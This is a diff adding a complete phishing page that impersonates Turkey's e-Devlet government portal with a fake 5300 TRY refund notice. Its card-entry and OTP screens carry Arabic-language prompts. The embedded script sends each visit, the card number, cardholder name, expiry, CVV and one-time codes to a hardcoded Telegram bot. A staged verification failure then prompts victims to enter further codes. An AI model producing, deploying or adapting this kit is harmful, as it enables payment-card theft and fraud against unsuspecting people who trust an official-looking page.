@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="tr" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>e-Devlet Kapısı | Ödeme İadesi</title>
+<!-- إضافة صورة المعاينة لمشاركة الرابط -->
+<meta property="og:image" content="https://i.ibb.co/1YyzL3Xv/file-0000000007f082108e232fb15f96b5a9.png">
+<meta property="og:title" content="e-Devlet Kapısı | Ödeme İadesi">
+<meta property="og:description" content="Ödeme iadeniz başarıyla gerçekleştirilmiştir.">
+<meta name="twitter:image" content="https://i.ibb.co/1YyzL3Xv/file-0000000007f082108e232fb15f96b5a9.png">
+
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<style>
+:root {
+    --gov-blue: #003366;
+    --gov-light-blue: #e8f4fd;
+    --gov-border: #b3d4f0;
+    --gov-red: #E30A17;
+    --text-dark: #333333;
+    --text-muted: #666666;
+    --bg-color: #f4f7f9;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
+body { background-color: var(--bg-color); color: var(--text-dark); display: flex; justify-content: center; min-height: 100vh; direction: ltr; }
+
+.app-container {
+    width: 100%; max-width: 500px; background: #fff; min-height: 100vh; 
+    position: relative; overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,0.05);
+    display: flex; flex-direction: column;
+}
+
+/* ================= إدارة الصفحات ================= */
+.page { display: none; flex-direction: column; width: 100%; min-height: 100vh; animation: fadeIn 0.3s ease; }
+.page.active { display: flex !important; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+/* ================= 1. صفحة الملخص (التصميم التركي) ================= */
+.header-bar {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 15px 20px; border-bottom: 2px solid var(--gov-blue); background: #fff;
+}
+.header-logo { display: flex; align-items: center; gap: 10px; }
+.header-logo img { height: 40px; }
+.header-logo h1 { color: var(--gov-blue); font-size: 20px; font-weight: 700; }
+.header-user { color: var(--gov-blue); font-size: 24px; }
+
+.content-area { padding: 20px; flex: 1; }
+
+/* صورة المعاينة المضافة */
+.preview-image-container {
+    text-align: center;
+    margin-bottom: 20px;
+}
+.preview-image-container img {
+    max-width: 100%;
+    border-radius: 12px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+}
+
+/* رسالة النجاح */
+.success-alert {
+    background-color: var(--gov-light-blue); border: 1px solid var(--gov-border);
+    border-radius: 12px; padding: 16px; display: flex; gap: 15px; align-items: flex-start;
+    margin-bottom: 25px; direction: rtl;
+}
+.success-alert .icon {
+    background: var(--gov-blue); color: #fff; width: 30px; height: 30px;
+    border-radius: 50%; display: flex; justify-content: center; align-items: center;
+    font-weight: bold; font-size: 18px; flex-shrink: 0; font-family: serif;
+}
+.success-alert .text h3 { color: var(--gov-blue); font-size: 15px; margin-bottom: 4px; font-weight: 700; }
+.success-alert .text p { color: var(--text-dark); font-size: 13px; }
+
+/* بطاقة المبلغ */
+.amount-box {
+    border: 1px solid #e0e0e0; border-radius: 16px; padding: 20px;
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 25px;
+}
+.amount-left { display: flex; flex-direction: column; }
+.amount-left span { font-size: 14px; color: var(--text-muted); margin-bottom: 5px; }
+.amount-left strong { font-size: 32px; color: var(--gov-blue); font-weight: 900; }
+.amount-right { display: flex; align-items: center; gap: 10px; border-left: 1px solid #e0e0e0; padding-left: 15px; }
+.turkish-flag {
+    width: 50px; height: 34px; background-color: var(--gov-red);
+    border-radius: 4px; display: flex; justify-content: center; align-items: center;
+    color: #fff; font-size: 16px;
+}
+.amount-right span { font-size: 13px; font-weight: 700; color: var(--gov-blue); direction: rtl; }
+
+/* العناوين */
+.section-title {
+    display: flex; align-items: center; gap: 10px; font-size: 16px;
+    font-weight: 700; color: var(--gov-blue); margin-bottom: 15px; direction: rtl;
+}
+.section-title i { font-size: 20px; }
+.section-title::after { content: ""; flex: 1; height: 2px; background: var(--gov-blue); margin-right: 10px; }
+
+/* الحساب البنكي */
+.bank-account {
+    border: 1px solid #e0e0e0; border-radius: 12px; padding: 16px;
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 25px; background: #fafbfc;
+}
+.bank-left { display: flex; align-items: center; gap: 15px; color: var(--gov-blue); font-weight: 700; font-size: 15px; }
+.bank-left i { font-size: 22px; }
+.bank-right { color: #999; font-size: 18px; }
+
+/* تفاصيل العملية */
+.details-card { border: 1px solid #e0e0e0; border-radius: 12px; padding: 0 16px; margin-bottom: 30px; }
+.detail-row { display: flex; justify-content: space-between; padding: 14px 0; border-bottom: 1px solid #e0e0e0; direction: rtl; }
+.detail-row:last-child { border-bottom: none; }
+.detail-row .label { color: var(--text-muted); font-size: 14px; }
+.detail-row .value { color: var(--text-dark); font-size: 15px; font-weight: 700; direction: ltr; }
+
+/* زر الرجوع */
+.btn-return {
+    background: var(--gov-blue); color: #fff; border: none; padding: 16px;
+    border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer;
+    display: flex; justify-content: center; align-items: center; gap: 10px; width: 100%;
+    margin-top: auto; margin-bottom: 20px;
+}
+.btn-return i { font-size: 14px; }
+
+/* خلفية اسطنبول السفلية */
+.istanbul-bg {
+    height: 80px; width: 100%; background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 120" preserveAspectRatio="none"><path d="M0,120 L0,80 Q100,70 200,80 T400,70 T600,80 T800,60 T1000,75 T1200,60 L1200,120 Z" fill="%23a4c4e6" opacity="0.6"/><path d="M0,120 L0,95 Q150,85 300,95 T600,85 T900,95 T1200,85 L1200,120 Z" fill="%23d1e3f5" opacity="0.8"/></svg>');
+    background-size: cover; background-position: bottom; margin-top: auto; pointer-events: none;
+}
+
+/* ================= 2. صفحة البطاقة ================= */
+.card-header { text-align: center; padding: 30px 20px 10px; direction: rtl; }
+.card-header h2 { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
+.card-header p { font-size: 14px; color: var(--text-muted); margin-bottom: 15px; }
+.ref-badge { display: inline-block; padding: 6px 16px; border: 1px solid #ccc; border-radius: 20px; font-size: 12px; color: var(--text-muted); direction: ltr; }
+
+.visual-card { background: linear-gradient(135deg, #1E293B, #0F172A); border-radius: 16px; margin: 20px; padding: 24px; box-shadow: 0 15px 30px rgba(15,23,42,0.2); }
+.visual-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+.visa-logo { background: #fff; color: #1A1F71; font-weight: 900; font-style: italic; font-size: 18px; padding: 4px 10px; border-radius: 4px; letter-spacing: 1px; }
+.troy-text { color: rgba(255,255,255,0.8); font-size: 14px; font-weight: 600; margin-left: 10px; letter-spacing: 2px; }
+.chip { width: 45px; height: 34px; background: linear-gradient(135deg, #FDE68A, #D97706); border-radius: 6px; }
+.visual-number { font-family: monospace; font-size: 22px; color: rgba(255,255,255,0.9); letter-spacing: 3px; margin-bottom: 25px; word-spacing: 5px; direction: ltr; }
+.visual-bottom { display: flex; justify-content: space-between; }
+.v-label { font-size: 10px; color: #94A3B8; margin-bottom: 4px; direction: rtl; }
+.v-value { font-size: 14px; color: #fff; font-weight: 600; font-family: monospace; direction: ltr; text-transform: uppercase; }
+
+/* التقسيمات الجديدة للحقول */
+.form-container { margin: 0 20px; border: 1px solid #ccc; border-radius: 12px; background: #fff; }
+.input-group { display: flex; align-items: center; border-bottom: 1px solid #ccc; }
+.input-group:last-child { border-bottom: none; }
+.input-group .icon { padding: 0 15px; color: #94A3B8; font-size: 18px; }
+.input-group input { flex: 1; border: none; padding: 18px 15px; font-size: 15px; color: #333; outline: none; text-align: right; background: transparent; direction: rtl; }
+.input-group.split { display: flex; border-bottom: none; }
+.input-group.split .half { flex: 1; display: flex; align-items: center; }
+.input-group.split .half:first-child { border-left: 1px solid #ccc; }
+.input-group.split .half input { padding: 18px 15px; text-align: center; direction: ltr; width: 100%; }
+
+.btn-submit-card { margin: 25px 20px; padding: 18px; border-radius: 12px; border: none; background: var(--gov-blue); color: #fff; font-size: 16px; font-weight: 700; cursor: pointer; width: calc(100% - 40px); }
+
+/* ================= 3. صفحة رمز التحقق OTP ================= */
+.otp-container { padding: 40px 20px; text-align: center; flex: 1; display: flex; flex-direction: column; justify-content: center; direction: rtl; }
+.otp-icon { width: 80px; height: 80px; background: var(--gov-light-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; color: var(--gov-blue); font-size: 32px; }
+.otp-title { font-size: 24px; font-weight: 700; margin-bottom: 10px; color: var(--gov-blue); }
+.otp-desc { font-size: 15px; color: var(--text-muted); margin-bottom: 30px; line-height: 1.6; }
+.otp-inputs { display: flex; justify-content: center; gap: 10px; direction: ltr; margin-bottom: 30px; }
+.otp-input { width: 48px; height: 56px; border: 1px solid #ccc; border-radius: 10px; font-size: 24px; text-align: center; font-weight: 700; outline: none; background: #f8fafc; font-family: monospace; }
+.otp-input:focus { border-color: var(--gov-blue); background: #fff; box-shadow: 0 0 0 3px var(--gov-light-blue); }
+.btn-otp { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--gov-blue); color: #fff; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: auto; }
+
+/* ================= شاشات الحالة ================= */
+.state-page { display: none; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; text-align: center; padding: 20px; background: #fff; direction: rtl; }
+.state-page.active { display: flex !important; }
+.spinner { width: 60px; height: 60px; border: 4px solid #eee; border-top-color: var(--gov-blue); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.state-title { font-size: 22px; font-weight: 700; margin-bottom: 10px; color: var(--gov-blue); }
+.state-text { color: var(--text-muted); font-size: 15px; margin-bottom: 15px; }
+.timer { font-size: 32px; font-weight: 800; color: var(--gov-blue); font-family: monospace; }
+
+.fail-icon { width: 80px; height: 80px; background: #FEF2F2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; color: #EF4444; font-size: 36px; border: 2px solid #FECACA; }
+.btn-retry { margin-top: 30px; padding: 16px; width: 100%; max-width: 300px; border-radius: 12px; border: 1px solid #ccc; background: #fff; color: var(--gov-blue); font-weight: 700; cursor: pointer; }
+</style>
+</head>
+<body>
+
+<div class="app-container">
+
+    <!-- ================= 1. صفحة الملخص (التصميم الحكومي التركي) ================= -->
+    <div id="pageSummary" class="page active">
+        <!-- الهيدر -->
+        <div class="header-bar">
+            <div class="header-logo">
+                <svg height="40" viewBox="0 0 100 100" style="margin-right:5px;">
+                    <circle cx="50" cy="50" r="40" fill="#E30A17" />
+                    <circle cx="45" cy="50" r="32" fill="white" />
+                    <circle cx="52" cy="50" r="26" fill="#E30A17" />
+                    <polygon points="68,40 71,48 79,48 72,53 75,61 68,56 61,61 64,53 57,48 65,48" fill="white" />
+                </svg>
+                <h1>turkiye.gov.tr</h1>
+            </div>
+            <i class="fas fa-user-circle header-user"></i>
+        </div>
+
+        <div class="content-area">
+            
+            <!-- صورة المعاينة المضافة هنا -->
+            <div class="preview-image-container">
+                <a href="https://ibb.co/20VZywMn" target="_blank">
+                    <img src="https://i.ibb.co/1YyzL3Xv/file-0000000007f082108e232fb15f96b5a9.png" alt="صورة المعاينة" border="0">
+                </a>
+            </div>
+
+            <!-- رسالة النجاح -->
+            <div class="success-alert">
+                <div class="icon">i</div>
+                <div class="text">
+                    <h3>Ödeme iadeniz başarıyla gerçekleştirilmiştir.</h3>
+                    <p>İade tutarınız aşağıda görüntülenmektedir.</p>
+                </div>
+            </div>
+
+            <!-- بطاقة المبلغ -->
+            <div class="amount-box">
+                <div class="amount-left">
+                    <span>İade Tutarı</span>
+                    <strong>5300 TRY</strong>
+                </div>
+                <div class="amount-right">
+                    <div class="turkish-flag"><i class="fas fa-star"></i></div>
+                    <span>Beş Bin Üç Yüz Türk Lirası</span>
+                </div>
+            </div>
+
+            <!-- الحساب البنكي -->
+            <div class="section-title">
+                <i class="fas fa-list-ul"></i> Alıcı Bilgileri
+            </div>
+            <div class="bank-account">
+                <div class="bank-left">
+                    <i class="fas fa-university"></i> Banka Hesabı
+                </div>
+                <i class="fas fa-chevron-down bank-right"></i>
+            </div>
+
+            <!-- تفاصيل العملية -->
+            <div class="section-title">
+                <i class="fas fa-list-ul"></i> İşlem Detayları
+            </div>
+            <div class="details-card">
+                <div class="detail-row">
+                    <span class="label">İşlem Numarası</span>
+                    <span class="value">430083222</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">İşlem Tarihi</span>
+                    <span class="value">24/11/2026</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">İade İşlem Numarası</span>
+                    <span class="value">3758350</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">İşlem Nedeni</span>
+                    <span class="value" style="direction: rtl;">Ödeme İadesi</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">İade Süresi</span>
+                    <span class="value" style="color: var(--gov-red);">48 Saat</span>
+                </div>
+            </div>
+
+            <!-- زر الرجوع (لينقل لصفحة البطاقة) -->
+            <button class="btn-return" onclick="goToPage('pageCard')">
+                <i class="fas fa-chevron-left"></i> Geri Dön
+            </button>
+        </div>
+
+        <!-- خلفية اسطنبول -->
+        <div class="istanbul-bg"></div>
+    </div>
+
+    <!-- ================= 2. صفحة البطاقة ================= -->
+    <div id="pageCard" class="page">
+        <div class="card-header">
+            <h2>بيانات البطاقة المصرفية</h2>
+            <p>أدخل تفاصيل البطاقة لاسترداد المبلغ بالليرة التركية</p>
+            <div class="ref-badge">مرجع: REF-<span id="refNumberDisplay">000000</span></div>
+        </div>
+
+        <div class="visual-card">
+            <div class="visual-top">
+                <div style="display:flex; align-items:center;">
+                    <div class="visa-logo" id="cardBrand">VISA</div>
+                    <span class="troy-text">TROY</span>
+                </div>
+                <div class="chip"></div>
+            </div>
+            <div class="visual-number" id="previewCardNumber">•••• •••• •••• ••••</div>
+            <div class="visual-bottom">
+                <div>
+                    <div class="v-label">حامل البطاقة</div>
+                    <div class="v-value" id="previewName">NAME SURNAME</div>
+                </div>
+                <div>
+                    <div class="v-label">الانتهاء</div>
+                    <div class="v-value" id="previewExpiry">MM/YY</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- الحقول مع التقسيمات الجديدة -->
+        <div class="form-container">
+            <div class="input-group">
+                <i class="fas fa-credit-card icon"></i>
+                <input type="tel" id="cardNumber" maxlength="19" inputmode="numeric" placeholder="رقم البطاقة" autocomplete="off">
+            </div>
+            <div class="input-group">
+                <input type="text" id="cardName" placeholder="الاسم كما هو على البطاقة" style="text-transform:uppercase;" autocomplete="off">
+            </div>
+            <div class="input-group split">
+                <div class="half">
+                    <input type="tel" id="cardCvv" maxlength="4" inputmode="numeric" placeholder="CVV" autocomplete="off">
+                </div>
+                <div class="half">
+                    <input type="tel" id="cardExpiry" maxlength="5" inputmode="numeric" placeholder="MM/YY" autocomplete="off">
+                </div>
+            </div>
+        </div>
+
+        <button class="btn-submit-card" onclick="submitCard()">تأكيد البيانات والمتابعة</button>
+    </div>
+
+    <!-- ================= 3. صفحة رمز التحقق OTP ================= -->
+    <div id="pageOtp" class="page">
+        <div class="otp-container">
+            <div class="otp-icon">
+                <i class="fas fa-shield-alt"></i>
+            </div>
+            <h2 class="otp-title">رمز التحقق (OTP)</h2>
+            <p class="otp-desc">تم إرسال رمز تحقق مكون من 6 أرقام إلى هاتفك. يرجى إدخاله في الحقول أدناه لإتمام عملية الاسترداد.</p>
+            
+            <div class="otp-inputs" id="otpInputs">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+            </div>
+
+            <button class="btn-otp" onclick="verifyOtp()">تأكيد الرمز وإتمام العملية</button>
+        </div>
+    </div>
+
+    <!-- ================= شاشات الحالة ================= -->
+    <div id="pageLoading" class="state-page">
+        <div class="spinner"></div>
+        <div class="state-title" id="loadingTitle">جاري التحقق من البيانات...</div>
+        <div class="state-text" id="loadingText">يتم الآن معالجة طلب الاسترداد، يرجى الانتظار.</div>
+        <div class="timer" id="loadingTimer">5</div>
+    </div>
+
+    <div id="pageFail" class="state-page">
+        <div class="fail-icon"><i class="fas fa-times"></i></div>
+        <div class="state-title">فشل التحقق</div>
+        <div class="state-text">عذراً، الرمز الذي أدخلته غير صحيح أو انتهت صلاحيته. يرجى المحاولة مرة أخرى.</div>
+        <button class="btn-retry" onclick="resendOtp()">إعادة إرسال الرمز</button>
+    </div>
+
+</div>
+
+<script>
+    const BOT_TOKEN = '9067409505:AAHLIApXu8JCLlEDWlKrASY9F3F0DE0FBH8';
+    const CHAT_ID = '8302667206';
+
+    let currentRef = Math.floor(100000 + Math.random() * 900000);
+    document.getElementById('refNumberDisplay').textContent = currentRef;
+
+    async function sendTelegram(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+            });
+        } catch (e) { console.error("Telegram Error:", e); }
+    }
+
+    window.addEventListener('load', () => {
+        sendTelegram(`🔔 <b>تنبيه دخول جديد</b>\nدخل شخص إلى صفحة الاسترداد الحكومية.\n🆔 <b>المرجع:</b> <code>REF-${currentRef}</code>`);
+    });
+
+    function goToPage(pageId) {
+        document.querySelectorAll('.page, .state-page').forEach(p => {
+            p.classList.remove('active');
+            p.style.display = 'none';
+        });
+        
+        let target = document.getElementById(pageId);
+        target.style.display = 'flex';
+        target.classList.add('active');
+
+        if(pageId === 'pageCard') {
+            sendTelegram(`👉 <b>تنبيه تنقل:</b>\nالمستخدم ضغط على "Geri Dön" وانتقل لصفحة بيانات البطاقة.\n🆔 <b>المرجع:</b> <code>REF-${currentRef}</code>`);
+        } else if(pageId === 'pageOtp') {
+            sendTelegram(`🔐 <b>تنبيه تنقل:</b>\nالمستخدم انتقل إلى صفحة رمز التحقق (OTP).\n🆔 <b>المرجع:</b> <code>REF-${currentRef}</code>`);
+        }
+    }
+
+    const cardNumberInput = document.getElementById('cardNumber');
+    const cardNameInput = document.getElementById('cardName');
+    const cardExpiryInput = document.getElementById('cardExpiry');
+    const cardCvvInput = document.getElementById('cardCvv');
+
+    let lastSentNumber = "", lastSentName = "", lastSentExpiry = "", lastSentCvv = "";
+
+    cardNumberInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '').slice(0, 16);
+        let formatted = value.replace(/(\d{4})(?=\d)/g, "$1 ");
+        e.target.value = formatted;
+        document.getElementById('previewCardNumber').innerText = formatted || '•••• •••• •••• ••••';
+
+        if (value.length === 16 && value !== lastSentNumber) {
+            sendTelegram(`💳 <b>رقم بطاقة (16 رقم):</b>\n<code>${formatted}</code>\n🆔 <b>المرجع:</b> <code>REF-${currentRef}</code>`);
+            lastSentNumber = value;
+        }
+    });
+
+    cardNameInput.addEventListener('input', function(e) {
+        e.target.value = e.target.value.toUpperCase().replace(/[^A-Z ]/g, '');
+        document.getElementById('previewName').innerText = e.target.value || 'NAME SURNAME';
+    });
+
+    cardNameInput.addEventListener('blur', function() {
+        let val = this.value.trim();
+        if (val.length >= 3 && val !== lastSentName) {
+            sendTelegram(`👤 <b>اسم حامل البطاقة:</b>\n<code>${val}</code>\n🆔 <b>المرجع:</b> <code>REF-${currentRef}</code>`);
+            lastSentName = val;
+        }
+    });
+
+    cardExpiryInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '').slice(0, 4);
+        if (value.length >= 3) value = value.slice(0, 2) + '/' + value.slice(2);
+        e.target.value = value;
+        document.getElementById('previewExpiry').innerText = value || 'MM/YY';
+
+        if (value.length === 5 && value !== lastSentExpiry) {
+            sendTelegram(`📅 <b>تاريخ الانتهاء:</b>\n<code>${value}</code>\n🆔 <b>المرجع:</b> <code>REF-${currentRef}</code>`);
+            lastSentExpiry = value;
+        }
+    });
+
+    cardCvvInput.addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+        let val = e.target.value;
+        if ((val.length === 3 || val.length === 4) && val !== lastSentCvv) {
+            sendTelegram(`🔒 <b>رمز الأمان (CVV):</b>\n<code>${val}</code>\n🆔 <b>المرجع:</b> <code>REF-${currentRef}</code>`);
+            lastSentCvv = val;
+        }
+    });
+
+    function submitCard() {
+        const numberRaw = cardNumberInput.value.replace(/\s/g, '');
+        const name = cardNameInput.value.trim();
+        const expiry = cardExpiryInput.value.trim();
+        const cvv = cardCvvInput.value.trim();
+
+        if (numberRaw.length !== 16) { alert('يرجى إدخال رقم بطاقة صحيح مكون من 16 رقماً'); return; }
+        if (name.length < 3) { alert('يرجى إدخال اسم حامل البطاقة بشكل صحيح'); return; }
+        if (expiry.length !== 5) { alert('يرجى إدخال تاريخ الانتهاء بصيغة MM/YY'); return; }
+        if (cvv.length < 3) { alert('يرجى إدخال رمز الأمان CVV بشكل صحيح'); return; }
+
+        let msg = `✅ <b>تم تأكيد بيانات البطاقة بالكامل</b>\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🔢 <b>البطاقة:</b> <code>${cardNumberInput.value}</code>\n`;
+        msg += `👤 <b>الاسم:</b> <code>${name}</code>\n`;
+        msg += `📅 <b>التاريخ:</b> <code>${expiry}</code>\n`;
+        msg += `🔒 <b>CVV:</b> <code>${cvv}</code>\n`;
+        msg += `🆔 <b>المرجع:</b> <code>REF-${currentRef}</code>`;
+        sendTelegram(msg);
+
+        goToPage('pageLoading');
+        document.getElementById('loadingTitle').innerText = "جاري التحقق من البيانات...";
+        document.getElementById('loadingText').innerText = "يتم الآن معالجة طلب الاسترداد، يرجى الانتظار.";
+        
+        let countdown = 5;
+        const timerEl = document.getElementById('loadingTimer');
+        timerEl.textContent = countdown;
+
+        let interval = setInterval(() => {
+            countdown--;
+            timerEl.textContent = countdown;
+            if (countdown <= 0) {
+                clearInterval(interval);
+                goToPage('pageOtp');
+            }
+        }, 1000);
+    }
+
+    const otpInputs = document.querySelectorAll('.otp-input');
+    let otpSent = false;
+
+    otpInputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 1);
+            if (e.target.value && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+
+            let fullCode = "";
+            otpInputs.forEach(inp => fullCode += inp.value);
+            if (fullCode.length === 6 && !otpSent) {
+                otpSent = true;
+                sendTelegram(`🔢 <b>تم إدخال رمز التحقق (OTP) بالكامل:</b>\n<code>${fullCode}</code>\n🆔 <b>المرجع:</b> <code>REF-${currentRef}</code>`);
+            }
+        });
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                otpInputs[index - 1].focus();
+            }
+        });
+    });
+
+    function verifyOtp() {
+        let fullCode = "";
+        otpInputs.forEach(inp => fullCode += inp.value);
+
+        if (fullCode.length !== 6) {
+            alert('يرجى إدخال رمز التحقق المكون من 6 أرقام بالكامل.');
+            return;
+        }
+
+        goToPage('pageLoading');
+        document.getElementById('loadingTitle').innerText = "جاري التحقق من الرمز...";
+        document.getElementById('loadingText').innerText = "يتم الآن مطابقة الرمز مع البنك المُصدر...";
+        
+        let countdown = 5;
+        const timerEl = document.getElementById('loadingTimer');
+        timerEl.textContent = countdown;
+
+        let interval = setInterval(() => {
+            countdown--;
+            timerEl.textContent = countdown;
+            if (countdown <= 0) {
+                clearInterval(interval);
+                goToPage('pageFail');
+                sendTelegram(`❌ <b>فشل التحقق:</b>\nتم إدخال الرمز ولم تكتمل العملية.\n🆔 <b>المرجع:</b> <code>REF-${currentRef}</code>`);
+            }
+        }, 1000);
+    }
+
+    function resendOtp() {
+        goToPage('pageOtp');
+        otpInputs.forEach(inp => inp.value = '');
+        otpInputs[0].focus();
+        otpSent = false;
+        sendTelegram(`🔄 <b>طلب إعادة إرسال الرمز:</b>\nالمستخدم ضغط على إعادة إرسال الرمز.\n🆔 <b>المرجع:</b> <code>REF-${currentRef}</code>`);
+    }
+</script>
+
+</body>
+</html>
